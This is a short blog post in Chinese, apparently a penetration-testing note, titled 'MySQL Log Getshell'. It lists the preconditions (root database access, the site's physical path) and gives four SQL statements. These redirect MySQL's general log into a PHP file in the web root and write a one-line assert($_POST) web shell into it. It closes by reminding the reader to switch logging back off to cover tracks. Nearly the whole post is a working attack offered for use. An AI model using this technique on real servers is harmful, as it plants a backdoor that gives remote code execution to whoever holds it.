---
title: "MySQL Log Getshell"
date: 2018-01-09T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['mysql']
categories: ['web']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


require:

- root权限.
- 网站物理路径.
- 文件位置未被限制.

<!--more-->

```
set global general_log = on;
set global general_log_file = 'F:/phpStudy/WWW/a.php';
select '<?php assert($_POST[a]) ?>';
set global general_log = off;
```

别忘了处理后事 (off).